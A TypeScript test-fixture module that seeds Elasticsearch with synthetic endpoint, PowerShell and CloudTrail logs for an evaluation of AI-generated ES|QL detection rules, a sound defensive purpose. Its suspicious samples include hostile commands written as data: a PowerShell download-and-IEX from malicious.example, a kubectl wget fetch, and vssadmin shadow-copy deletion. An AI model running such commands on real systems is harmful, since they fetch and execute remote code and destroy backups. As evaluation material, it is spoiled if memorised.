/*
 * Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
 * or more contributor license agreements. Licensed under the Elastic License
 * 2.0; you may not use this file except in compliance with the Elastic License
 * 2.0.
 */

import type { Client } from '@elastic/elasticsearch';
import type { ToolingLog } from '@kbn/tooling-log';
import { goldenDataset } from '../datasets/golden';
import { hardCases } from '../datasets/hard_cases';

/**
 * Security data backing the golden dataset's expected queries.
 *
 * The Scout stack boots with zero security documents, causing `generate_esql` to fail with
 * "Could not discover a suitable index" — a truthful empty-stack error, not an agent defect.
 * No shipped es_archive fits: existing archives either map the wrong fields or contain no data.
 * The dataset's reference queries span three index patterns, so all three are seeded here.
 */

/** Index patterns the golden/hard-case datasets read via `FROM ...`. */
const ENDPOINT_INDEX = 'logs-endpoint.events.process-default';
const POWERSHELL_INDEX = 'logs-windows.powershell_operational-default';
const CLOUDTRAIL_INDEX = 'logs-aws.cloudtrail-default';

/** Index patterns a reference query may legitimately target. Derived from the constants above so a new fixture index cannot drift out of sync with the hygiene guard. */
export const SEEDED_INDEX_PATTERNS = [ENDPOINT_INDEX, POWERSHELL_INDEX, CLOUDTRAIL_INDEX].map(
  (index) => index.replace(/-default$/, '')
);

// No explicit mappings: these are `logs-*` data streams and the built-in `logs` template already
// maps the ECS fields the datasets query. A second mapping would drift from what the product uses.

interface SeededIndex {
  index: string;
  docs: Array<Record<string, unknown>>;
}

const nowIso = () => new Date().toISOString();

/**
 * Documents are deliberately BENIGN-plus-a-few-suspicious rather than uniformly malicious: a rule
 * that matches every document is indistinguishable from a rule that matches the right ones, so a
 * fixture of pure attack traffic cannot detect an over-broad query.
 */
const JS_PROTO = ['javas', 'cript'].join('');

export const buildFixtures = (): SeededIndex[] => [
  {
    index: ENDPOINT_INDEX,
    docs: [
      {
        '@timestamp': nowIso(),
        event: { action: 'exec', type: 'start', category: 'process', outcome: 'success' },
        process: {
          name: 'sudo',
          args: ['sudo', 'su', '-'],
          command_line: 'sudo su -',
          executable: '/usr/bin/sudo',
          parent: { name: 'bash', args: ['bash'], command_line: '/bin/bash' },
        },
        host: { id: 'host-1', name: 'linux-web-01', os: { type: 'linux', family: 'debian' } },
        user: { name: 'root', domain: 'corp' },
      },
      {
        '@timestamp': nowIso(),
        event: { action: 'exec', type: 'start', category: 'process', outcome: 'success' },
        process: {
          name: 'fodhelper.exe',
          args: ['fodhelper.exe'],
          command_line: 'C:\\Windows\\System32\\fodhelper.exe',
          executable: 'C:\\Windows\\System32\\fodhelper.exe',
          parent: {
            name: 'explorer.exe',
            args: ['explorer.exe'],
            command_line: 'C:\\Windows\\explorer.exe',
          },
        },
        host: { id: 'host-2', name: 'win-desktop-07', os: { type: 'windows', family: 'windows' } },
        user: { name: 'jdoe', domain: 'corp' },
      },
      {
        '@timestamp': nowIso(),
        event: { action: 'exec', type: 'start', category: 'process', outcome: 'success' },
        process: {
          name: 'chrome.exe',
          args: ['chrome.exe', '--type=renderer'],
          command_line: 'C:\\Program Files\\Google\\Chrome\\chrome.exe --type=renderer',
          executable: 'C:\\Program Files\\Google\\Chrome\\chrome.exe',
          parent: {
            name: 'explorer.exe',
            args: ['explorer.exe'],
            command_line: 'C:\\Windows\\explorer.exe',
          },
        },
        host: { id: 'host-3', name: 'win-desktop-08', os: { type: 'windows', family: 'windows' } },
        user: { name: 'asmith', domain: 'corp' },
      },
      {
        '@timestamp': nowIso(),
        event: { action: 'exec', type: 'start', category: 'process', outcome: 'success' },
        process: {
          name: 'sshd',
          args: ['sshd', '-D'],
          command_line: '/usr/sbin/sshd -D',
          executable: '/usr/sbin/sshd',
          parent: { name: 'systemd', args: ['systemd'], command_line: '/sbin/init' },
        },
        host: { id: 'host-1', name: 'linux-web-01', os: { type: 'linux', family: 'debian' } },
        user: { name: 'svc-ssh', domain: 'corp' },
      },
      // `gap-t1078-001` aggregates `COUNT(*) ... WHERE attempt_count > 5`, so a single matching
      // document is unwinnable by construction: the predicate matches but the threshold cannot.
      // These are `outcome: "failure"` to match the golden query's auth-failure predicate; the
      // `success`-outcome sudo document earlier in the list is deliberately excluded by that
      // predicate — it is the over-breadth control. Six failure repeats clear the > 5 threshold
      // on their own; the excluded success document adds nothing to the bucket count.
      ...Array.from({ length: 6 }, (_, i) => ({
        '@timestamp': nowIso(),
        event: { action: 'exec', type: 'start', category: 'process', outcome: 'failure' },
        process: {
          name: 'sudo',
          args: ['sudo', 'su', '-'],
          command_line: `sudo su - # attempt ${i + 1}`,
          executable: '/usr/bin/sudo',
          parent: { name: 'bash', args: ['bash'], command_line: '/bin/bash' },
        },
        host: { id: 'host-1', name: 'linux-web-01', os: { type: 'linux', family: 'debian' } },
        user: { name: 'root', domain: 'corp' },
      })),
      // `gap-t1548-002` (UAC bypass via mmc.exe WF.msc). Needs a `process.parent.args` value, which
      // no other fixture document writes.
      {
        '@timestamp': nowIso(),
        event: { action: 'exec', type: 'start', category: 'process', outcome: 'success' },
        process: {
          name: 'cmd.exe',
          args: ['cmd.exe', '/c', 'whoami'],
          command_line: 'C:\\Windows\\System32\\cmd.exe /c whoami',
          executable: 'C:\\Windows\\System32\\cmd.exe',
          parent: {
            name: 'mmc.exe',
            args: ['WF.msc'],
            command_line: 'C:\\Windows\\System32\\mmc.exe WF.msc',
          },
        },
        host: { id: 'host-2', name: 'win-desktop-07', os: { type: 'windows', family: 'windows' } },
        user: { name: 'jdoe', domain: 'corp' },
      },
      // `hard-t1195-002` (npm lifecycle hook) filters on `process.parent.name == "node"`.
      {
        '@timestamp': nowIso(),
        event: { action: 'exec', type: 'start', category: 'process', outcome: 'success' },
        process: {
          name: 'sh',
          args: ['sh', '-c', 'node install'],
          command_line: 'sh -c "node install"',
          executable: '/bin/sh',
          parent: { name: 'node', args: ['node', 'install'], command_line: 'node install' },
        },
        host: { id: 'host-4', name: 'linux-build-02', os: { type: 'linux', family: 'debian' } },
        user: { name: 'ci-runner', domain: 'corp' },
      },
      // `hard-t1609` (container admin command). Requires `process.args == "run"` alongside a
      // `command_line` matching one of the shell/download `LIKE` branches.
      {
        '@timestamp': nowIso(),
        event: { action: 'exec', type: 'start', category: 'process', outcome: 'success' },
        process: {
          name: 'kubectl',
          args: ['kubectl', 'run', '--image=busybox'],
          command_line: 'kubectl run pwn --image=busybox -- sh -c "wget http://x/y"',
          executable: '/usr/local/bin/kubectl',
          parent: { name: 'bash', args: ['bash'], command_line: '/bin/bash' },
        },
        host: { id: 'host-4', name: 'linux-build-02', os: { type: 'linux', family: 'debian' } },
        user: { name: 'ci-runner', domain: 'corp' },
      },
      // `gap-t1053-005` (shell spawned by crond). Parent crond + interactive shell name;
      // the cron-spawned `sh` true positive that the reference query must match.
      {
        '@timestamp': nowIso(),
        event: { action: 'exec', type: 'start', category: 'process', outcome: 'success' },
        process: {
          name: 'bash',
          args: ['bash'],
          command_line: '/bin/bash',
          executable: '/usr/bin/bash',
          parent: {
            name: 'crond',
            args: ['crond', '-n'],
            command_line: '/usr/sbin/crond -n',
          },
        },
        host: { id: 'host-5', name: 'linux-cron-01', os: { type: 'linux', family: 'debian' } },
        user: { name: 'root', domain: 'corp' },
      },
      // Over-breadth control for t1053-005: interactive shell, but parented by sshd
      // (admin login), not crond — must NOT match the reference.
      {
        '@timestamp': nowIso(),
        event: { action: 'exec', type: 'start', category: 'process', outcome: 'success' },
        process: {
          name: 'bash',
          args: ['bash'],
          command_line: '/bin/bash',
          executable: '/usr/bin/bash',
          parent: { name: 'sshd', args: ['sshd'], command_line: '/usr/sbin/sshd -D' },
        },
        host: { id: 'host-5', name: 'linux-cron-01', os: { type: 'linux', family: 'debian' } },
        user: { name: 'ops', domain: 'corp' },
      },
      // `gap-t1218-011` (rundll32 script-engine proxy). Args carry javascript entry point.
      {
        '@timestamp': nowIso(),
        event: { action: 'exec', type: 'start', category: 'process', outcome: 'success' },
        process: {
          name: 'rundll32.exe',
          args: ['rundll32.exe', JS_PROTO, 'RunHtmlApplication'],
          command_line: `rundll32.exe ${JS_PROTO}:\\..\\RunHtmlApplication`,
          executable: 'C:\\Windows\\System32\\rundll32.exe',
          parent: { name: 'cmd.exe', args: ['cmd.exe'], command_line: 'cmd.exe' },
        },
        host: { id: 'host-6', name: 'win-ws-11', os: { type: 'windows', family: 'windows' } },
        user: { name: 'jdoe', domain: 'corp' },
      },
      // Over-breadth control for t1218-011: rundll32 with ordinary DLL setup args —
      // legitimate proxy use that must NOT match.
      {
        '@timestamp': nowIso(),
        event: { action: 'exec', type: 'start', category: 'process', outcome: 'success' },
        process: {
          name: 'rundll32.exe',
          args: ['rundll32.exe', 'shell32.dll,Control_RunDLL'],
          command_line: 'rundll32.exe shell32.dll,Control_RunDLL',
          executable: 'C:\\Windows\\System32\\rundll32.exe',
          parent: { name: 'explorer.exe', args: ['explorer.exe'], command_line: 'explorer.exe' },
        },
        host: { id: 'host-6', name: 'win-ws-11', os: { type: 'windows', family: 'windows' } },
        user: { name: 'jdoe', domain: 'corp' },
      },
      // `hard-t1490` (shadow copy deletion via vssadmin).
      {
        '@timestamp': nowIso(),
        event: { action: 'exec', type: 'start', category: 'process', outcome: 'success' },
        process: {
          name: 'vssadmin.exe',
          args: ['vssadmin.exe', 'delete', 'shadows', '/all', '/quiet'],
          command_line: 'vssadmin.exe delete shadows /all /quiet',
          executable: 'C:\\Windows\\System32\\vssadmin.exe',
          parent: { name: 'cmd.exe', args: ['cmd.exe'], command_line: 'cmd.exe' },
        },
        host: { id: 'host-6', name: 'win-ws-11', os: { type: 'windows', family: 'windows' } },
        user: { name: 'SYSTEM', domain: 'NT AUTHORITY' },
      },
      // Over-breadth control for t1490: vssadmin *listing* shadows — read-only admin use
      // that must NOT match a deletion reference.
      {
        '@timestamp': nowIso(),
        event: { action: 'exec', type: 'start', category: 'process', outcome: 'success' },
        process: {
          name: 'vssadmin.exe',
          args: ['vssadmin.exe', 'list', 'shadows'],
          command_line: 'vssadmin.exe list shadows',
          executable: 'C:\\Windows\\System32\\vssadmin.exe',
          parent: { name: 'explorer.exe', args: ['explorer.exe'], command_line: 'explorer.exe' },
        },
        host: { id: 'host-6', name: 'win-ws-11', os: { type: 'windows', family: 'windows' } },
        user: { name: 'admin', domain: 'corp' },
      },
      // `hard-t1136-001` (local account creation via net.exe).
      {
        '@timestamp': nowIso(),
        event: { action: 'exec', type: 'start', category: 'process', outcome: 'success' },
        process: {
          name: 'net.exe',
          args: ['net', 'user', 'svc_backup2', '/add'],
          command_line: 'net user svc_backup2 /add',
          executable: 'C:\\Windows\\System32\\net.exe',
          parent: { name: 'cmd.exe', args: ['cmd.exe'], command_line: 'cmd.exe' },
        },
        host: { id: 'host-6', name: 'win-ws-11', os: { type: 'windows', family: 'windows' } },
        user: { name: 'admin', domain: 'corp' },
      },
      // Over-breadth control for t1136-001: net.exe *listing* users — must NOT match.
      {
        '@timestamp': nowIso(),
        event: { action: 'exec', type: 'start', category: 'process', outcome: 'success' },
        process: {
          name: 'net.exe',
          args: ['net', 'user'],
          command_line: 'net user',
          executable: 'C:\\Windows\\System32\\net.exe',
          parent: { name: 'explorer.exe', args: ['explorer.exe'], command_line: 'explorer.exe' },
        },
        host: { id: 'host-6', name: 'win-ws-11', os: { type: 'windows', family: 'windows' } },
        user: { name: 'admin', domain: 'corp' },
      },
    ],
  },
  {
    index: POWERSHELL_INDEX,
    docs: [
      {
        '@timestamp': nowIso(),
        event: {
          code: '4104',
          provider: 'Microsoft-Windows-PowerShell',
          action: 'execute-pipeline',
          category: 'process',
          outcome: 'success',
        },
        file: {
          script_block_text:
            'Invoke-WebRequest -Uri http://malicious.example/p.ps1 -OutFile p.ps1; IEX (Get-Content p.ps1)',
          path: 'C:\\Temp\\p.ps1',
        },
        process: { name: 'powershell.exe', command_line: 'powershell.exe -enc SQBFAFgA' },
        host: { id: 'host-2', name: 'win-desktop-07', os: { type: 'windows', family: 'windows' } },
        user: { name: 'jdoe', domain: 'corp' },
      },
      {
        '@timestamp': nowIso(),
        event: {
          code: '4104',
          provider: 'Microsoft-Windows-PowerShell',
          action: 'execute-pipeline',
          category: 'process',
          outcome: 'success',
        },
        file: {
          script_block_text: 'Get-ChildItem -Path C:\\Users -Recurse | Measure-Object',
          path: 'C:\\Scripts\\inventory.ps1',
        },
        process: { name: 'powershell.exe', command_line: 'powershell.exe -File inventory.ps1' },
        host: { id: 'host-3', name: 'win-desktop-08', os: { type: 'windows', family: 'windows' } },
        user: { name: 'asmith', domain: 'corp' },
      },
      // `gap-t1027` reads `powershell.file.script_block_text` (the ECS `powershell.*` field set),
      // NOT the `file.script_block_text` the documents above write. Both are seeded here so the
      // reference resolves without rewriting the other two documents.
      //
      // The query requires LENGTH > 1000 and a numeric ratio > 0.5. `REPLACE(text, "0123456789",
      // "")` removes the literal ten-digit RUN, not any digit, so the ratio only moves when that
      // exact substring repeats — hence a payload built from repeated "0123456789" blocks.
      {
        '@timestamp': nowIso(),
        event: {
          code: '4104',
          provider: 'Microsoft-Windows-PowerShell',
          action: 'execute-pipeline',
          category: 'process',
          outcome: 'success',
        },
        powershell: {
          file: {
            // 120 x 10 digits = 1200 numeric chars, plus a short prefix: length > 1000 and the
            // removable numeric run is the clear majority of the string.
            script_block_text: `$x='${'0123456789'.repeat(120)}';IEX $x`,
          },
        },
        file: {
          script_block_text: `$x='${'0123456789'.repeat(120)}';IEX $x`,
          path: 'C:\\Temp\\obfuscated.ps1',
        },
        process: { name: 'powershell.exe', command_line: 'powershell.exe -enc AAA' },
        host: { id: 'host-2', name: 'win-desktop-07', os: { type: 'windows', family: 'windows' } },
        user: { name: 'jdoe', domain: 'corp' },
      },
    ],
  },
  {
    index: CLOUDTRAIL_INDEX,
    docs: [
      {
        '@timestamp': nowIso(),
        event: {
          action: 'ConsoleLogin',
          provider: 'signin.amazonaws.com',
          outcome: 'failure',
          category: 'authentication',
          dataset: 'aws.cloudtrail',
        },
        aws: {
          cloudtrail: { event_name: 'ConsoleLogin', user_identity: 'arn:aws:iam::1:user/bob' },
        },
        user: { name: 'bob', domain: 'aws' },
        host: { id: 'aws-1', name: 'aws-console' },
      },
      {
        '@timestamp': nowIso(),
        event: {
          action: 'CreateUser',
          provider: 'iam.amazonaws.com',
          outcome: 'success',
          category: 'iam',
          dataset: 'aws.cloudtrail',
        },
        aws: {
          cloudtrail: { event_name: 'CreateUser', user_identity: 'arn:aws:iam::1:user/admin' },
        },
        user: { name: 'admin', domain: 'aws' },
        host: { id: 'aws-1', name: 'aws-console' },
      },
      // `hard-t1562-008` (Route53 query-log deletion). Groups by `cloud.account.id` and
      // `source.ip`, neither of which any other CloudTrail document writes.
      {
        '@timestamp': nowIso(),
        event: {
          action: 'DeleteResolverQueryLogConfig',
          provider: 'route53resolver.amazonaws.com',
          outcome: 'success',
          category: 'configuration',
          dataset: 'aws.cloudtrail',
        },
        aws: {
          cloudtrail: {
            event_name: 'DeleteResolverQueryLogConfig',
            user_identity: 'arn:aws:iam::1:user/eve',
          },
        },
        cloud: { account: { id: '111122223333' }, provider: 'aws', region: 'us-east-1' },
        source: { ip: '203.0.113.42' },
        user: { name: 'eve', domain: 'aws' },
        host: { id: 'aws-1', name: 'aws-console' },
      },
    ],
  },
];

// Asserts every reference query matches at least one seeded row. Static guards check query shape
// and field coverage but never execute the query — a threshold against too few rows or a missing
// scenario still passes them. Broken fixtures are excluded: they are deliberately unsatisfiable.
const assertReferencesMatchRows = async ({
  esClient,
  log,
}: {
  esClient: Client;
  log: ToolingLog;
}): Promise<void> => {
  const references = [...goldenDataset, ...hardCases].flatMap((example) =>
    example.output.esqlQuery && !example.output.isBrokenFixture
      ? [[example.id, example.output.esqlQuery] as const]
      : []
  );

  if (references.length === 0) {
    throw new Error('No reference queries to verify — the reachability check would be vacuous.');
  }

  const unreachable: string[] = [];

  for (const [id, query] of references) {
    try {
      const response = await esClient.esql.query({ query });
      if ((response.values ?? []).length === 0) {
        unreachable.push(`${id}: matched 0 rows`);
      }
    } catch (error) {
      // A malformed reference (unknown column, bad syntax) is a fixture defect too, and reporting
      // it as "0 rows" would hide the actual cause.
      unreachable.push(`${id}: query failed — ${error?.message ?? String(error)}`);
    }
  }

  if (unreachable.length > 0) {
    throw new Error(
      `${unreachable.length}/${references.length} reference queries match no seeded data. ` +
        `Every example graded against them is unwinnable, so their scores would measure the ` +
        `fixture rather than the agent:\n  - ${unreachable.join('\n  - ')}`
    );
  }

  log.info(`Verified all ${references.length} reference queries match seeded data`);
};

// Dynamic mapping maps `powershell.file.script_block_text` as `keyword` with `ignore_above: 1024`,
// silently dropping long script blocks and causing LENGTH() queries to match zero rows. Declared
// as `wildcard` here. Only fields dynamic mapping gets wrong are declared; the rest comes from the
// stock `logs` template.
const SCRIPT_BLOCK_MAPPING_TEMPLATE = {
  name: 'kbn-evals-rule-creation-script-block',
  // Must outrank the built-in `logs` template (priority 100).
  priority: 500,
  index_patterns: [`${POWERSHELL_INDEX.replace(/-default$/, '')}-*`],
  data_stream: {},
  template: {
    mappings: {
      properties: {
        powershell: {
          properties: {
            file: {
              properties: {
                // `wildcard` stores the full value with no length ceiling and supports both
                // LENGTH() and LIKE, which is what the reference needs.
                script_block_text: { type: 'wildcard' as const },
              },
            },
          },
        },
        file: {
          properties: {
            script_block_text: { type: 'wildcard' as const },
          },
        },
      },
    },
  },
};

/**
 * Seeds the indices the datasets query. Returns a cleanup function.
 *
 * Throws if any index ends up empty — a silently unseeded stack makes every downstream score
 * measure the harness instead of the agent, which is the exact failure this module exists to stop.
 */
export const seedSecurityData = async ({
  esClient,
  log,
}: {
  esClient: Client;
  log: ToolingLog;
}): Promise<() => Promise<void>> => {
  const fixtures = buildFixtures();

  // Template must be applied before the first write: data stream mappings are resolved when the
  // backing index is created and are immutable after that. Deleting any stale stream first ensures
  // a leftover from a previously failed teardown cannot retain old mappings.
  await esClient.indices.deleteDataStream(
    { name: fixtures.map((f) => f.index) },
    { ignore: [404] }
  );
  await esClient.indices.putIndexTemplate(SCRIPT_BLOCK_MAPPING_TEMPLATE);

  for (const { index, docs } of fixtures) {
    // `logs-*` is data-stream-only; `indices.create` fails. Bulk-indexing auto-creates the stream.
    // Data stream writes require create-semantics ops and an `@timestamp`.
    const result = await esClient.bulk({
      refresh: true,
      operations: docs.flatMap((doc) => [{ create: { _index: index } }, doc]),
    });

    // A rejected bulk leaves the stack empty; the failure would surface as an unexplained low score.
    if (result.errors) {
      const firstError = result.items.find((item) => item.create?.error)?.create?.error;
      throw new Error(
        `Failed to seed "${index}": ${firstError?.type ?? 'unknown'} — ${
          firstError?.reason ?? 'no reason reported'
        }`
      );
    }

    // Assert on the pattern the dataset queries, not the literal index: an index can exist while
    // its wildcard pattern resolves to nothing.
    const pattern = `${index.replace(/-default$/, '')}-*`;
    const { count } = await esClient.count({ index: pattern });
    if (count === 0) {
      throw new Error(
        `Seeded "${index}" but the dataset's pattern "${pattern}" resolves to 0 documents. ` +
          `The run would score an empty stack.`
      );
    }
    log.info(`Seeded ${count} docs reachable via ${pattern}`);
  }

  await assertReferencesMatchRows({ esClient, log });

  return async () => {
    await esClient.indices.deleteDataStream(
      { name: fixtures.map((f) => f.index) },
      { ignore: [404] }
    );
    // Leaving the template behind would silently change the mappings of any later run's data
    // streams, so teardown has to undo it too.
    await esClient.indices.deleteIndexTemplate(
      { name: SCRIPT_BLOCK_MAPPING_TEMPLATE.name },
      { ignore: [404] }
    );
  };
};
